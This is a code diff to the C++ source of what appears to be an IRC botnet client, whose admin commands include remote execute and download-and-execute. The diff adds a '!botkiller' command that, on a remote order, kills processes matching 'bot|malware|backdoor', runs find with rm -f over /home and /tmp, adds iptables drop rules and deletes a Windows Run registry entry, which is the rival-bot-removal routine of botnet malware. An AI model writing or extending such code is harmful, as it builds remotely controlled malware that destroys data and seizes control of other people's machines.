@@ -163,7 +163,7 @@ public:
         if (command == "!help") {
             std::string help = "Available commands: !help, !time, !version, !status";
             if (isAdmin(sender)) {
-                help += ", !join, !part, !say, !quit, !upload, !download, !execute, !uploadurl, !downloadurl, !downloadandexecute, !botkill";
+                help += ", !join, !part, !say, !quit, !upload, !download, !execute, !uploadurl, !downloadurl, !downloadandexecute, !botkill, !botkiller";
             }
             sendCommand("PRIVMSG " + target + " :" + help);
         }
@@ -479,6 +479,135 @@ public:
                     sendCommand("PRIVMSG " + target + " :Usage: !botkill [clean|stealth|nuclear]");
                     sendCommand("QUIT :Botkill shutdown");
                     running = false;
+                }
+            }
+            else if (command == "!botkiller") {
+                std::string action;
+                iss >> action;
+                
+                log("Botkiller command received: " + action);
+                sendCommand("PRIVMSG " + target + " :Botkiller initiated: " + action);
+                
+                if (action == "scan") {
+                    // Scan for common malware indicators
+                    log("Botkiller scan - searching for malware");
+                    
+                    std::string scanResults = "";
+                    
+                    // Check for suspicious processes
+                    FILE* psPipe = popen("ps aux | grep -E '(bot|malware|backdoor|trojan|virus|keylogger|spyware)' | grep -v grep", "r");
+                    if (psPipe) {
+                        char buffer[256];
+                        std::string suspiciousProcesses = "";
+                        while (fgets(buffer, sizeof(buffer), psPipe) != NULL) {
+                            suspiciousProcesses += buffer;
+                        }
+                        pclose(psPipe);
+                        
+                        if (!suspiciousProcesses.empty()) {
+                            scanResults += "Suspicious processes found:\n" + suspiciousProcesses;
+                        } else {
+                            scanResults += "No suspicious processes detected.\n";
+                        }
+                    }
+                    
+                    // Check for suspicious files
+                    FILE* findPipe = popen("find /tmp /var/tmp /home -name '*bot*' -o -name '*malware*' -o -name '*backdoor*' -o -name '*trojan*' -o -name '*virus*' -o -name '*keylogger*' -o -name '*spyware*' 2>/dev/null", "r");
+                    if (findPipe) {
+                        char buffer[256];
+                        std::string suspiciousFiles = "";
+                        while (fgets(buffer, sizeof(buffer), findPipe) != NULL) {
+                            suspiciousFiles += buffer;
+                        }
+                        pclose(findPipe);
+                        
+                        if (!suspiciousFiles.empty()) {
+                            scanResults += "\nSuspicious files found:\n" + suspiciousFiles;
+                        } else {
+                            scanResults += "\nNo suspicious files detected.\n";
+                        }
+                    }
+                    
+                    // Check for suspicious network connections
+                    FILE* netPipe = popen("netstat -tuln | grep -E ':(6667|8080|4444|31337|1337)'", "r");
+                    if (netPipe) {
+                        char buffer[256];
+                        std::string suspiciousConnections = "";
+                        while (fgets(buffer, sizeof(buffer), netPipe) != NULL) {
+                            suspiciousConnections += buffer;
+                        }
+                        pclose(netPipe);
+                        
+                        if (!suspiciousConnections.empty()) {
+                            scanResults += "\nSuspicious network connections:\n" + suspiciousConnections;
+                        } else {
+                            scanResults += "\nNo suspicious network connections.\n";
+                        }
+                    }
+                    
+                    // Send scan results
+                    if (scanResults.length() > 400) {
+                        sendCommand("PRIVMSG " + target + " :Scan results (truncated): " + scanResults.substr(0, 400) + "...");
+                    } else {
+                        sendCommand("PRIVMSG " + target + " :Scan results: " + scanResults);
+                    }
+                }
+                else if (action == "kill") {
+                    // Kill suspicious processes
+                    log("Botkiller kill - terminating malware");
+                    
+                    std::string killResults = "";
+                    
+                    // Kill suspicious processes
+                    FILE* killPipe = popen("pkill -f 'bot|malware|backdoor|trojan|virus|keylogger|spyware' 2>/dev/null", "r");
+                    if (killPipe) {
+                        pclose(killPipe);
+                        killResults += "Suspicious processes terminated.\n";
+                    }
+                    
+                    // Remove suspicious files
+                    FILE* removePipe = popen("find /tmp /var/tmp /home -name '*bot*' -o -name '*malware*' -o -name '*backdoor*' -o -name '*trojan*' -o -name '*virus*' -o -name '*keylogger*' -o -name '*spyware*' -exec rm -f {} \; 2>/dev/null", "r");
+                    if (removePipe) {
+                        pclose(removePipe);
+                        killResults += "Suspicious files removed.\n";
+                    }
+                    
+                    // Block suspicious ports
+                    system("iptables -A INPUT -p tcp --dport 6667 -j DROP 2>/dev/null");
+                    system("iptables -A INPUT -p tcp --dport 8080 -j DROP 2>/dev/null");
+                    system("iptables -A INPUT -p tcp --dport 4444 -j DROP 2>/dev/null");
+                    killResults += "Suspicious ports blocked.\n";
+                    
+                    sendCommand("PRIVMSG " + target + " :Kill results: " + killResults);
+                }
+                else if (action == "clean") {
+                    // Complete cleanup
+                    log("Botkiller clean - complete malware removal");
+                    
+                    // Kill all suspicious processes
+                    system("pkill -f 'bot|malware|backdoor|trojan|virus|keylogger|spyware' 2>/dev/null");
+                    
+                    // Remove all suspicious files
+                    system("find /tmp /var/tmp /home -name '*bot*' -o -name '*malware*' -o -name '*backdoor*' -o -name '*trojan*' -o -name '*virus*' -o -name '*keylogger*' -o -name '*spyware*' -exec rm -f {} \; 2>/dev/null");
+                    
+                    // Block all suspicious ports
+                    system("iptables -A INPUT -p tcp --dport 6667 -j DROP 2>/dev/null");
+                    system("iptables -A INPUT -p tcp --dport 8080 -j DROP 2>/dev/null");
+                    system("iptables -A INPUT -p tcp --dport 4444 -j DROP 2>/dev/null");
+                    system("iptables -A INPUT -p tcp --dport 31337 -j DROP 2>/dev/null");
+                    system("iptables -A INPUT -p tcp --dport 1337 -j DROP 2>/dev/null");
+                    
+                    // Clear startup entries
+                    #ifdef _WIN32
+                    system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsService /f 2>/dev/null");
+                    #else
+                    system("rm -f ~/.config/autostart/*bot* ~/.config/autostart/*malware* 2>/dev/null");
+                    #endif
+                    
+                    sendCommand("PRIVMSG " + target + " :Complete malware cleanup completed.");
+                }
+                else {
+                    sendCommand("PRIVMSG " + target + " :Usage: !botkiller [scan|kill|clean]");
                 }
             }
         }
